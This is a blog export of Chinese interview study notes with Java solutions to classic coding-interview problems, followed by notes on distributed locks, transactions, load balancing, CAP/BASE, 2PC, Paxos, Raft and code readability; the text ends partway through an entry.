题目描述输入：”I am a student.” 输出：”student. a am I” 解题思路题目应该有一个隐含条件，就是不能用额外的空间。虽然 Java 的题目输入参数为 String 类型，需要先创建一个字符数组使得空间复杂度为 O(N)，但是正确的参数类型应该和原书一样，为字符数组，并且只能使用该字符数组的空间。任何使用了额外空间的解法在面试时都会大打折扣，包括递归解法。 正确的解法应该是和书上一样，先旋转每个单词，再旋转整个字符串。 12345678910111213141516171819202122232425262728public String ReverseSentence(String str)&#123; int n = str.length(); char[] chars = str.toCharArray(); int i = 0, j = 0; while (j &lt;= n) &#123; if (j == n || chars[j] == ' ') &#123; reverse(chars, i, j - 1); i = j + 1; &#125; j++; &#125; reverse(chars, 0, n - 1); return new String(chars);&#125;private void reverse(char[] c, int i, int j)&#123; while (i &lt; j) swap(c, i++, j--);&#125;private void swap(char[] c, int i, int j)&#123; char t = c[i]; c[i] = c[j]; c[j] = t;&#125; 58.2 左旋转字符串NowCoder 题目描述对于一个给定的字符序列 S，请你把其循环左移 K 位后的序列输出。例如，字符序列 S=”abcXYZdef”, 要求输出循环左移 3 位后的结果，即“XYZdefabc”。 解题思路将 “abcXYZdef” 旋转左移三位，可以先将 “abc” 和 “XYZdef” 分别旋转，得到 “cbafedZYX”，然后再把整个字符串旋转得到 “XYZdefabc”。 1234567891011121314151617181920212223public String LeftRotateString(String str, int n)&#123; if (n &gt;= str.length()) return str; char[] chars = str.toCharArray(); reverse(chars, 0, n - 1); reverse(chars, n, chars.length - 1); reverse(chars, 0, chars.length - 1); return new String(chars);&#125;private void reverse(char[] chars, int i, int j)&#123; while (i &lt; j) swap(chars, i++, j--);&#125;private void swap(char[] chars, int i, int j)&#123; char t = chars[i]; chars[i] = chars[j]; chars[j] = t;&#125; 59. 滑动窗口的最大值NowCoder 题目描述给定一个数组和滑动窗口的大小，找出所有滑动窗口里数值的最大值。例如，如果输入数组 {2, 3, 4, 2, 6, 2, 5, 1} 及滑动窗口的大小 3，那么一共存在 6 个滑动窗口，他们的最大值分别为 {4, 4, 6, 6, 6, 5}。 解题思路12345678910111213141516public ArrayList&lt;Integer&gt; maxInWindows(int[] num, int size)&#123; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); if (size &gt; num.length || size &lt; 1) return ret; PriorityQueue&lt;Integer&gt; heap = new PriorityQueue&lt;&gt;((o1, o2) -&gt; o2 - o1); /* 大顶堆 */ for (int i = 0; i &lt; size; i++) heap.add(num[i]); ret.add(heap.peek()); for (int i = 1, j = i + size - 1; j &lt; num.length; i++, j++) &#123; /* 维护一个大小为 size 的大顶堆 */ heap.remove(num[i - 1]); heap.add(num[j]); ret.add(heap.peek()); &#125; return ret;&#125; 60. n 个骰子的点数Lintcode 题目描述把 n 个骰子仍在地上，求点数和为 s 的概率。 解题思路动态规划解法使用一个二维数组 dp 存储点数出现的次数，其中 dp[i][j] 表示前 i 个骰子产生点数 j 的次数。 空间复杂度：O(N2) 123456789101112131415161718192021public List&lt;Map.Entry&lt;Integer, Double&gt;&gt; dicesSum(int n)&#123; final int face = 6; final int pointNum = face * n; long[][] dp = new long[n + 1][pointNum + 1]; for (int i = 1; i &lt;= face; i++) dp[1][i] = 1; for (int i = 2; i &lt;= n; i++) for (int j = i; j &lt;= pointNum; j++) /* 使用 i 个骰子最小点数为 i */ for (int k = 1; k &lt;= face &amp;&amp; k &lt;= j; k++) dp[i][j] += dp[i - 1][j - k]; final double totalNum = Math.pow(6, n); List&lt;Map.Entry&lt;Integer, Double&gt;&gt; ret = new ArrayList&lt;&gt;(); for (int i = n; i &lt;= pointNum; i++) ret.add(new AbstractMap.SimpleEntry&lt;&gt;(i, dp[n][i] / totalNum)); return ret;&#125; 动态规划解法 + 旋转数组空间复杂度：O(N) 1234567891011121314151617181920212223242526public List&lt;Map.Entry&lt;Integer, Double&gt;&gt; dicesSum(int n)&#123; final int face = 6; final int pointNum = face * n; long[][] dp = new long[2][pointNum + 1]; for (int i = 1; i &lt;= face; i++) dp[0][i] = 1; int flag = 1; /* 旋转标记 */ for (int i = 2; i &lt;= n; i++, flag = 1 - flag) &#123; for (int j = 0; j &lt;= pointNum; j++) dp[flag][j] = 0; /* 旋转数组清零 */ for (int j = i; j &lt;= pointNum; j++) for (int k = 1; k &lt;= face &amp;&amp; k &lt;= j; k++) dp[flag][j] += dp[1 - flag][j - k]; &#125; final double totalNum = Math.pow(6, n); List&lt;Map.Entry&lt;Integer, Double&gt;&gt; ret = new ArrayList&lt;&gt;(); for (int i = n; i &lt;= pointNum; i++) ret.add(new AbstractMap.SimpleEntry&lt;&gt;(i, dp[1 - flag][i] / totalNum)); return ret;&#125; 61. 扑克牌顺子NowCoder 题目描述五张牌，其中大小鬼为癞子，牌面大小为 0。判断是否能组成顺子。 解题思路1234567891011121314151617public boolean isContinuous(int[] nums)&#123; if (nums.length &lt; 5) return false; Arrays.sort(nums); int cnt = 0; for (int num : nums) /* 统计癞子数量 */ if (num == 0) cnt++; for (int i = cnt; i &lt; nums.length - 1; i++) &#123; if (nums[i + 1] == nums[i]) return false; cnt -= nums[i + 1] - nums[i] - 1; /* 使用癞子去补全不连续的顺子 */ &#125; return cnt &gt;= 0;&#125; 62. 圆圈中最后剩下的数NowCoder 题目描述让小朋友们围成一个大圈。然后，他随机指定一个数 m，让编号为 0 的小朋友开始报数。每次喊到 m-1 的那个小朋友要出列唱首歌，然后可以在礼品箱中任意的挑选礼物，并且不再回到圈中，从他的下一个小朋友开始，继续 0…m-1 报数 …. 这样下去 …. 直到剩下最后一个小朋友，可以不用表演。 解题思路约瑟夫环，圆圈长度为 n 的解可以看成长度为 n-1 的解再加上报数的长度 m。因为是圆圈，所以最后需要对 n 取余。 12345678public int LastRemaining_Solution(int n, int m)&#123; if (n == 0) /* 特殊输入的处理 */ return -1; if (n == 1) /* 返回条件 */ return 0; return (LastRemaining_Solution(n - 1, m) + m) % n;&#125; 63. 股票的最大利润Leetcode 题目描述可以有一次买入和一次卖出，买入必须在前。求最大收益。 解题思路使用贪心策略，假设第 i 轮进行卖出操作，买入操作价格应该在 i 之前并且价格最低。 123456789101112public int maxProfit(int[] prices)&#123; if (prices == null || prices.length == 0) return 0; int soFarMin = prices[0]; int maxProfit = 0; for (int i = 1; i &lt; prices.length; i++) &#123; soFarMin = Math.min(soFarMin, prices[i]); maxProfit = Math.max(maxProfit, prices[i] - soFarMin); &#125; return maxProfit;&#125; 64. 求 1+2+3+…+nNowCoder 题目描述求 1+2+3+…+n，要求不能使用乘除法、for、while、if、else、switch、case 等关键字及条件判断语句（A?B:C）。 解题思路使用递归解法最重要的是指定返回条件，但是本题无法直接使用 if 语句来指定返回条件。 条件与 &amp;&amp; 具有短路原则，即在第一个条件语句为 false 的情况下不会去执行第二个条件语句。利用这一特性，将递归的返回条件取非然后作为 &amp;&amp; 的第一个条件语句，递归的主体转换为第二个条件语句，那么当递归的返回条件为 true 的情况下就不会执行递归的主体部分，递归返回。 以下实现中，递归的返回条件为 n &lt;= 0，取非后就是 n &gt; 0，递归的主体部分为 sum += Sum_Solution(n - 1)，转换为条件语句后就是 (sum += Sum_Solution(n - 1)) &gt; 0。 123456public int Sum_Solution(int n)&#123; int sum = n; boolean b = (n &gt; 0) &amp;&amp; ((sum += Sum_Solution(n - 1)) &gt; 0); return sum;&#125; 65. 不用加减乘除做加法NowCoder 题目描述写一个函数，求两个整数之和，要求在函数体内不得使用 +、-、*、/ 四则运算符号。 解题思路a ^ b 表示没有考虑进位的情况下两数的和，(a &amp; b) &lt;&lt; 1 就是进位。 递归会终止的原因是 (a &amp; b) &lt;&lt; 1 最右边会多一个 0，那么继续递归，进位最右边的 0 会慢慢增多，最后进位会变为 0，递归终止。 1234public int Add(int a, int b)&#123; return b == 0 ? a : Add(a ^ b, (a &amp; b) &lt;&lt; 1);&#125; 66. 构建乘积数组NowCoder 题目描述给定一个数组 A[0, 1,…, n-1], 请构建一个数组 B[0, 1,…, n-1], 其中 B 中的元素 B[i]=A[0]*A[1]*…*A[i-1]*A[i+1]*…*A[n-1]。不能使用除法。 解题思路12345678910public int[] multiply(int[] A)&#123; int n = A.length; int[] B = new int[n]; for (int i = 0, product = 1; i &lt; n; product *= A[i], i++) /* 从左往右累乘 */ B[i] = product; for (int i = n - 1, product = 1; i &gt;= 0; product *= A[i], i--) /* 从右往左累乘 */ B[i] *= product; return B;&#125; 67. 把字符串转换成整数NowCoder 题目描述将一个字符串转换成一个整数，要求不能使用字符串转换整数的库函数。 数值为 0 或者字符串不是一个合法的数值则返回 0。 1234567Iuput:+21474836471a33Output:21474836470 解题思路12345678910111213141516public int StrToInt(String str)&#123; if (str == null || str.length() == 0) return 0; boolean isNegative = str.charAt(0) == '-'; int ret = 0; for (int i = 0; i &lt; str.length(); i++) &#123; char c = str.charAt(i); if (i == 0 &amp;&amp; (c == '+' || c == '-')) /* 符号判定 */ continue; if (c &lt; '0' || c &gt; '9') /* 非法输入 */ return 0; ret = ret * 10 + (c - '0'); &#125; return isNegative ? -ret : ret;&#125; 68. 树中两个节点的最低公共祖先解题思路二叉查找树 Leetcode : 235. Lowest Common Ancestor of a Binary Search Tree 二叉查找树中，两个节点 p, q 的公共祖先 root 满足 root.val &gt;= p.val &amp;&amp; root.val &lt;= q.val。 123456789public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) &#123; if (root == null) return root; if (root.val &gt; p.val &amp;&amp; root.val &gt; q.val) return lowestCommonAncestor(root.left, p, q); if (root.val &lt; p.val &amp;&amp; root.val &lt; q.val) return lowestCommonAncestor(root.right, p, q); return root;&#125; 普通二叉树 Leetcode : 236. Lowest Common Ancestor of a Binary Tree 在左右子树中查找是否存在 p 或者 q，如果 p 和 q 分别在两个子树中，那么就说明根节点就是 LCA。 1234567public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) &#123; if (root == null || root == p || root == q) return root; TreeNode left = lowestCommonAncestor(root.left, p, q); TreeNode right = lowestCommonAncestor(root.right, p, q); return left == null ? right : right == null ? left : root;&#125; 参考文献 何海涛. 剑指 Offer[M]. 电子工业出版社, 2012.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式问题分析]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E5%88%86%E5%B8%83%E5%BC%8F%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[一、分布式锁 数据库的唯一索引 Redis 的 SETNX 指令 Redis 的 RedLock 算法 Zookeeper 的有序节点 二、分布式事务 本地消息表 两阶段提交协议 三、分布式 Session Sticky Sessions Session Replication Session Server 四、负载均衡 算法 实现 一、分布式锁在单机场景下，可以使用 Java 提供的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。 阻塞锁通常使用互斥量来实现，互斥量为 1 表示有其它进程在使用锁，此时处于锁定状态，互斥量为 0 表示未锁定状态。1 和 0 可以用一个整型值来存储，也可以用某个数据存在或者不存在来存储，某个数据存在表示互斥量为 1。 数据库的唯一索引当想要获得锁时，就向表中插入一条记录，释放锁时就删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否存于锁定状态。 存在以下几个问题： 锁没有失效时间，解锁失败的话其他线程无法再获得锁。 只能是非阻塞锁，插入失败直接就报错了，无法重试。 不可重入，已经获得锁的进程也必须重新获取锁。 Redis 的 SETNX 指令使用 SETNX（set if not exist）指令插入一个键值对，如果 Key 已经存在，那么会返回 False，否则插入成功并返回 True。 SETNX 指令和数据库的唯一索引类似，可以保证只存在一个 Key 的键值对，可以用一个 Key 的键值对是否存在来判断是否存于锁定状态。 EXPIRE 指令可以为一个键值对设置一个过期时间，从而避免了数据库唯一索引实现方式中释放锁失败的问题。 Redis 的 RedLock 算法使用了多个 Redis 实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。 尝试从 N 个相互独立 Redis 实例获取锁，如果一个实例不可用，应该尽快尝试下一个。 计算获取锁消耗的时间，只有当这个时间小于锁的过期时间，并且从大多数（N/2+1）实例上获取了锁，那么就认为锁获取成功了。 如果锁获取失败，会到每个实例上释放锁。 Zookeeper 的有序节点1. Zookeeper 抽象模型Zookeeper 提供了一种树形结构级的命名空间，/app1/p_1 节点表示它的父节点为 /app1。 2. 节点类型 永久节点：不会因为会话结束或者超时而消失； 临时节点：如果会话结束或者超时就会消失； 有序节点：会在节点名的后面加一个数字后缀，并且是有序的，例如生成的有序节点为 /lock/node-0000000000，它的下一个有序节点则为 /lock/node-0000000001，以此类推。 3. 监听器为一个节点注册监听器，在节点状态发生改变时，会给客户端发送消息。 4. 分布式锁实现 创建一个锁目录 /lock； 当一个客户端需要获取锁时，在 /lock 下创建临时的且有序的子节点； 客户端获取 /lock 下的子节点列表，判断自己创建的子节点是否为当前子节点列表中序号最小的子节点，如果是则认为获得锁；否则监听自己的前一个子节点，获得子节点的变更通知后重复此步骤直至获得锁； 执行业务代码，完成后，删除对应的子节点。 5. 会话超时如果一个已经获得锁的会话超时了，因为创建的是临时节点，所以该会话对应的临时节点会被删除，其它会话就可以获得锁了。可以看到，Zookeeper 分布式锁不会出现数据库的唯一索引实现分布式锁的释放锁失败问题。 6. 羊群效应一个节点未获得锁，需要监听自己的前一个子节点，这是因为如果监听所有的子节点，那么任意一个子节点状态改变，其它所有子节点都会收到通知（羊群效应），而我们只希望它的后一个子节点收到通知。 参考： 浅谈分布式锁 Distributed locks with Redis 基于 Zookeeper 的分布式锁 二、分布式事务指事务的操作位于不同的节点上，需要保证事务的 AICD 特性。例如在下单场景下，库存和订单如果不在同一个节点上，就涉及分布式事务。 本地消息表1. 原理本地消息表与业务数据表处于同一个数据库中，这样就能利用本地事务来保证在对这两个表的操作满足事务特性。 在分布式事务操作的一方完成写业务数据的操作之后向本地消息表发送一个消息，本地事务能保证这个消息一定会被写入本地消息表中。 之后将本地消息表中的消息转发到 Kafka 等消息队列（MQ）中，如果转发成功则将消息从本地消息表中删除，否则继续重新转发。 在分布式事务操作的另一方从消息队列中读取一个消息，并执行消息中的操作。 2. 分析本地消息表利用了本地事务来实现分布式事务，并且使用了消息队列来保证最终一致性。 两阶段提交协议CyC2018/Interview-Notebook/一致性.md/2PC 参考： 聊聊分布式事务，再说说解决方案 分布式系统的事务处理 深入理解分布式事务 三、分布式 Session在分布式场景下，一个用户的 Session 如果只存储在一个服务器上，那么当负载均衡器把用户的下一个请求转发到另一个服务器上，该服务器没有用户的 Session，就可能导致用户需要重新进行登录等操作。 Sticky Sessions需要配置负载均衡器，使得一个用户的所有请求都路由到一个服务器节点上，这样就可以把用户的 Session 存放在该服务器节点中。 缺点：当服务器节点宕机时，将丢失该服务器节点上的所有 Session。 Session Replication在服务器节点之间进行 Session 同步操作，这样的话用户可以访问任何一个服务器节点。 缺点：占用过多内存；同步过程占用网络带宽以及服务器处理器时间。 Session Server使用一个单独的服务器存储 Session 数据，可以存在 MySQL 数据库上，也可以存在 Redis 或者 Memcached 这种内存型数据库。 缺点：需要去实现存取 Session 的代码。 参考： Session Management using Spring Session with JDBC DataStore 四、负载均衡算法1. 轮询（Round Robin）轮询算法把每个请求轮流发送到每个服务器上。下图中，一共有 6 个客户端产生了 6 个请求，这 6 个请求按 (1, 2, 3, 4, 5, 6) 的顺序发送。最后，(1, 3, 5) 的请求会被发送到服务器 1，(2, 4, 6) 的请求会被发送到服务器 2。 该算法比较适合每个服务器的性能差不多的场景，如果有性能存在差异的情况下，那么性能较差的服务器可能无法承担过大的负载（下图的 Server 2）。 2. 加权轮询（Weighted Round Robbin）加权轮询是在轮询的基础上，根据服务器的性能差异，为服务器赋予一定的权值。例如下图中，服务器 1 被赋予的权值为 5，服务器 2 被赋予的权值为 1，那么 (1, 2, 3, 4, 5) 请求会被发送到服务器 1，(6) 请求会被发送到服务器 2。 3. 最少连接（least Connections）由于每个请求的连接时间不一样，使用轮询或者加权轮询算法的话，可能会让一台服务器当前连接数过大，而另一台服务器的连接过小，造成负载不均衡。例如下图中，(1, 3, 5) 请求会被发送到服务器 1，但是 (1, 3) 很快就断开连接，此时只有 (5) 请求连接服务器 1；(2, 4, 6) 请求被发送到服务器 2，只有 (2) 的连接断开。该系统继续运行时，服务器 2 会承担过大的负载。 最少连接算法就是将请求发送给当前最少连接数的服务器上。例如下图中，服务器 1 当前连接数最小，那么新到来的请求 6 就会被发送到服务器 1 上。 4. 加权最少连接（Weighted Least Connection）在最少连接的基础上，根据服务器的性能为每台服务器分配权重，再根据权重计算出每台服务器能处理的连接数。 5. 随机算法（Random）把请求随机发送到服务器上。和轮询算法类似，该算法比较适合服务器性能差不多的场景。 6. 源地址哈希法 (IP Hash)源地址哈希通过对客户端 IP 哈希计算得到的一个数值，用该数值对服务器数量进行取模运算，取模结果便是目标服务器的序号。 优点：保证同一 IP 的客户端都会被 hash 到同一台服务器上。 缺点：不利于集群扩展，后台服务器数量变更都会影响 hash 结果。可以采用一致性 Hash 改进。 实现1. HTTP 重定向HTTP 重定向负载均衡服务器收到 HTTP 请求之后会返回服务器的地址，并将该地址写入 HTTP 重定向响应中返回给浏览器，浏览器收到后需要再次发送请求。 缺点： 用户访问的延迟会增加； 如果负载均衡器宕机，就无法访问该站点。 2. DNS 重定向使用 DNS 作为负载均衡器，根据负载情况返回不同服务器的 IP 地址。大型网站基本使用了这种方式做为第一级负载均衡手段，然后在内部使用其它方式做第二级负载均衡。 缺点： DNS 查找表可能会被客户端缓存起来，那么之后的所有请求都会被重定向到同一个服务器。 3. 修改 MAC 地址使用 LVS（Linux Virtual Server）这种链路层负载均衡器，根据负载情况修改请求的 MAC 地址。 4. 修改 IP 地址在网络层修改请求的目的 IP 地址。 5. 代理自动配置正向代理与反向代理的区别： 正向代理：发生在客户端，是由用户主动发起的。比如翻墙，客户端通过主动访问代理服务器，让代理服务器获得需要的外网数据，然后转发回客户端。 反向代理：发生在服务器端，用户不知道代理的存在。 PAC 服务器是用来判断一个请求是否要经过代理。 参考： Comparing Load Balancing Algorithms 负载均衡算法及手段 Redirection and Load Balancing]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码风格规范]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC%E8%A7%84%E8%8C%83%2F</url>
    <content type="text"><![CDATA[Twitter Java Style Guide Google Java Style Guide]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一致性]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E4%B8%80%E8%87%B4%E6%80%A7%2F</url>
    <content type="text"><![CDATA[一、CAP 一致性 可用性 分区容忍性 权衡 二、BASE 基本可用 软状态 最终一致性 三、2PC 运行过程 存在的问题 四、Paxos 执行过程 约束条件 五、Raft 单个 Candidate 的竞选 多个 Candidate 竞选 日志复制 参考资料 一、CAP分布式系统不可能同时满足一致性（C：Consistency）、可用性（A：Availability）和分区容忍性（P：Partition Tolerance），最多只能同时满足其中两项。 一致性一致性指的是多个数据副本是否能保持一致的特性。 在一致性的条件下，系统在执行数据更新操作之后能够从一致性状态转移到另一个一致性状态。 对系统的一个数据更新成功之后，如果所有用户都能够读取到最新的值，该系统就被认为具有强一致性。 可用性可用性指分布式系统在面对各种异常时可以提供正常服务的能力，可以用系统可用时间占总时间的比值来衡量，4 个 9 的可用性表示系统 99.99% 的时间是可用的。 在可用性条件下，系统提供的服务一直处于可用的状态，对于用户的每一个操作请求总是能够在有限的时间内返回结果。 分区容忍性网络分区指分布式系统中的节点被划分为多个区域，每个区域内部可以通信，但是区域之间无法通信。 在分区容忍性条件下，分布式系统在遇到任何网络分区故障的时候，仍然需要能对外提供一致性和可用性的服务，除非是整个网络环境都发生了故障。 权衡在分布式系统中，分区容忍性必不可少，因为需要总是假设网络是不可靠的。因此，CAP 理论实际在是要在可用性和一致性之间做权衡。 可用性和一致性往往是冲突的，很难都使它们同时满足。在多个节点之间进行数据同步时， 为了保证一致性（CP），就需要让所有节点下线成为不可用的状态，等待同步完成； 为了保证可用性（AP），在同步过程中允许读取所有节点的数据，但是数据可能不一致。 二、BASEBASE 是基本可用（Basically Available）、软状态（Soft State）和最终一致性（Eventually Consistent）三个短语的缩写。 BASE 理论是对 CAP 中一致性和可用性权衡的结果，它的理论的核心思想是：即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。 基本可用指分布式系统在出现故障的时候，保证核心可用，允许损失部分可用性。 例如，电商在做促销时，为了保证购物系统的稳定性，部分消费者可能会被引导到一个降级的页面。 软状态指允许系统中的数据存在中间状态，并认为该中间状态不会影响系统整体可用性，即允许系统不同节点的数据副本之间进行同步的过程存在延时。 最终一致性最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能达到一致的状态。 ACID 要求强一致性，通常运用在传统的数据库系统上。而 BASE 要求最终一致性，通过牺牲强一致性来达到可用性，通常运用在大型分布式系统中。 在实际的分布式场景中，不同业务单元和组件对一致性的要求是不同的，因此 ACID 和 BASE 往往会结合在一起使用。 三、2PC两阶段提交（Two-phase Commit，2PC） 主要用于实现分布式事务，分布式事务指的是事务操作跨越多个节点，并且要求满足事务的 ACID 特性。 通过引入协调者（Coordinator）来调度参与者的行为，，并最终决定这些参与者是否要真正执行事务。 运行过程1. 准备阶段协调者询问参与者事务是否执行成功，参与者发回事务执行结果。 2. 提交阶段如果事务在每个参与者上都执行成功，事务协调者发送通知让参与者提交事务；否则，协调者发送通知让参与者回滚事务。 需要注意的是，在准备阶段，参与者执行了事务，但是还未提交。只有在提交阶段接收到协调者发来的通知后，才进行提交或者回滚。 存在的问题1. 同步阻塞所有事务参与者在等待其它参与者响应的时候都处于同步阻塞状态，无法进行其它操作。 2. 单点问题协调者在 2PC 中起到非常大的作用，发生故障将会造成很大影响，特别是在阶段二发生故障，所有参与者会一直等待状态，无法完成其它操作。 3. 数据不一致在阶段二，如果协调者只发送了部分 Commit 消息，此时网络发生异常，那么只有部分参与者接收到 Commit 消息，也就是说只有部分参与者提交了事务，使得系统数据不一致。 4. 太过保守任意一个节点失败就会导致整个事务失败，没有完善的容错机制。 四、Paxos用于达成共识性问题，即对多个节点产生的值，该算法能保证只选出唯一一个值。 主要有三类节点： 提议者（Proposer）：提议一个值； 接受者（Acceptor）：对每个提议进行投票； 告知者（Learner）：被告知投票的结果，不参与投票过程。 执行过程规定一个提议包含两个字段：[n, v]，其中 n 为序号（具有唯一性），v 为提议值。 下图演示了两个 Proposer 和三个 Acceptor 的系统中运行该算法的初始过程，每个 Proposer 都会向所有 Acceptor 发送提议请求。 当 Acceptor 接收到一个提议请求，包含的提议为 [n1, v1]，并且之前还未接收过提议请求，那么发送一个提议响应，设置当前接收到的提议为 [n1, v1]，并且保证以后不会再接受序号小于 n1 的提议。 如下图，Acceptor X 在收到 [n=2, v=8] 的提议请求时，由于之前没有接收过提议，因此就发送一个 [no previous] 的提议响应，设置当前接收到的提议为 [n=2, v=8]，并且保证以后不会再接受序号小于 2 的提议。其它的 Acceptor 类似。 如果 Acceptor 接收到一个提议请求，包含的提议为 [n2, v2]，并且之前已经接收过提议 [n1, v1]。如果 n1 &gt; n2，那么就丢弃该提议请求；否则，发送提议响应，该提议响应包含之前已经接收过的提议 [n1, v1]，设置当前接收到的提议为 [n2, v2]，并且保证以后不会再接受序号小于 n2 的提议。 如下图，Acceptor Z 收到 Proposer A 发来的 [n=2, v=8] 的提议请求，由于之前已经接收过 [n=4, v=5] 的提议，并且 n &gt; 2，因此就抛弃该提议请求；Acceptor X 收到 Proposer B 发来的 [n=4, v=5] 的提议请求，因为之前接收到的提议为 [n=2, v=8]，并且 2 &lt;= 4，因此就发送 [n=2, v=8] 的提议响应，设置当前接收到的提议为 [n=4, v=5]，并且保证以后不会再接受序号小于 4 的提议。Acceptor Y 类似。 当一个 Proposer 接收到超过一半 Acceptor 的提议响应时，就可以发送接受请求。 Proposer A 接收到两个提议响应之后，就发送 [n=2, v=8] 接受请求。该接受请求会被所有 Acceptor 丢弃，因为此时所有 Acceptor 都保证不接受序号小于 4 的提议。 Proposer B 过后也收到了两个提议响应，因此也开始发送接受请求。需要注意的是，接受请求的 v 需要取它收到的最大 v 值，也就是 8。因此它发送 [n=4, v=8] 的接受请求。 Acceptor 接收到接受请求时，如果序号大于等于该 Acceptor 承诺的最小序号，那么就发送通知给所有的 Learner。当 Learner 发现有大多数的 Acceptor 接收了某个提议，那么该提议的提议值就被 Paxos 选择出来。 约束条件1. 正确性指只有一个提议值会生效。 因为 Paxos 协议要求每个生效的提议被多数 Acceptor 接收，并且 Acceptor 不会接受两个不同的提议，因此可以保证正确性。 2. 可终止性指最后总会有一个提议生效。 Paxos 协议能够让 Proposer 发送的提议朝着能被大多数 Acceptor 接受的那个提议靠拢，因此能够保证可终止性。 五、RaftRaft 和 Paxos 类似，但是更容易理解，也更容易实现。 Raft 主要是用来竞选主节点。 单个 Candidate 的竞选有三种节点：Follower、Candidate 和 Leader。Leader 会周期性的发送心跳包给 Follower。每个 Follower 都设置了一个随机的竞选超时时间，一般为 150ms~300ms，如果在这个时间内没有收到 Leader 的心跳包，就会变成 Candidate，进入竞选阶段。 下图表示一个分布式系统的最初阶段，此时只有 Follower，没有 Leader。Follower A 等待一个随机的竞选超时时间之后，没收到 Leader 发来的心跳包，因此进入竞选阶段。 此时 A 发送投票请求给其它所有节点。 其它节点会对请求进行回复，如果超过一半的节点回复了，那么该 Candidate 就会变成 Leader。 之后 Leader 会周期性地发送心跳包给 Follower，Follower 接收到心跳包，会重新开始计时。 多个 Candidate 竞选 如果有多个 Follower 成为 Candidate，并且所获得票数相同，那么就需要重新开始投票，例如下图中 Candidate B 和 Candidate D 都获得两票，因此需要重新开始投票。 当重新开始投票时，由于每个节点设置的随机竞选超时时间不同，因此能下一次再次出现多个 Candidate 并获得同样票数的概率很低。 日志复制 来自客户端的修改都会被传入 Leader。注意该修改还未被提交，只是写入日志中。 Leader 会把修改复制到所有 Follower。 Leader 会等待大多数的 Follower 也进行了修改，然后才将修改提交。 此时 Leader 会通知的所有 Follower 让它们也提交修改，此时所有节点的值达成一致。 参考资料 倪超. 从 Paxos 到 ZooKeeper : 分布式一致性原理与实践 [M]. 电子工业出版社, 2015. What is CAP theorem in distributed database system? NEAT ALGORITHMS - PAXOS Raft: Understandable Distributed Consensus Paxos By Example]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码可读性]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7%2F</url>
    <content type="text"><![CDATA[一、可读性的重要性 二、用名字表达代码含义 三、名字不能带来歧义 四、良好的代码风格 五、为何编写注释 六、如何编写注释 七、提高控制流的可读性 八、拆分长表达式 九、变量与可读性 十、抽取函数 十一、一次只做一件事 十二、用自然语言表述代码 十三、减少代码量 参考资料 一、可读性的重要性编程有很大一部分时间是在阅读代码，不仅要阅读自己的代码，而且要阅读别人的代码。因此，可读性良好的代码能够大大提高编程效率。 可读性良好的代码往往会让代码架构更好，因为程序员更愿意去修改这部分代码，而且也更容易修改。 只有在核心领域为了效率才可以放弃可读性，否则可读性是第一位。 二、用名字表达代码含义一些比较有表达力的单词： 单词 可替代单词 send deliver、dispatch、announce、distribute、route find search、extract、locate、recover start launch、create、begin、open make create、set up、build、generate、compose、add、new 使用 i、j、k 作为循环迭代器的名字过于简单，user_i、member_i 这种名字会更有表达力。因为循环层次越多，代码越难理解，有表达力的迭代器名字可读性会更高。 为名字添加形容词等信息能让名字更具有表达力，但是名字也会变长。名字长短的准则是：作用域越大，名字越长。因此只有在短作用域才能使用一些简单名字。 三、名字不能带来歧义起完名字要思考一下别人会对这个名字有何解读，会不会误解了原本想表达的含义。 布尔相关的命名加上 is、can、should、has 等前缀。 用 min、max 表示数量范围； 用 first、last 表示访问空间的包含范围； begin、end 表示访问空间的排除范围，即 end 不包含尾部。 四、良好的代码风格适当的空行和缩进。 排列整齐的注释： 123int a = 1; // 注释int b = 11; // 注释int c = 111; // 注释 语句顺序不能随意，比如与 html 表单相关联的变量的赋值应该和表单在 html 中的顺序一致。 五、为何编写注释阅读代码首先会注意到注释，如果注释没太大作用，那么就会浪费代码阅读的时间。那些能直接看出含义的代码不需要写注释，特别是并不需要为每个方法都加上注释，比如那些简单的 getter 和 setter 方法，为这些方法写注释反而让代码可读性更差。 不能因为有注释就随便起个名字，而是争取起个好名字而不写注释。 可以用注释来记录采用当前解决办法的思考过程，从而让读者更容易理解代码。 注释用来提醒一些特殊情况。 用 TODO 等做标记： 标记 用法 TODO 待做 FIXME 待修复 HACK 粗糙的解决方案 XXX 危险！这里有重要的问题 六、如何编写注释尽量简洁明了： 123// The first String is student's name// The Second Integer is student's scoreMap&lt;String, Integer&gt; scoreMap = new HashMap&lt;&gt;(); 12// Student's name -&gt; Student's scoreMap&lt;String, Integer&gt; scoreMap = new HashMap&lt;&gt;(); 添加测试用例来说明： 12345// ...// Example: 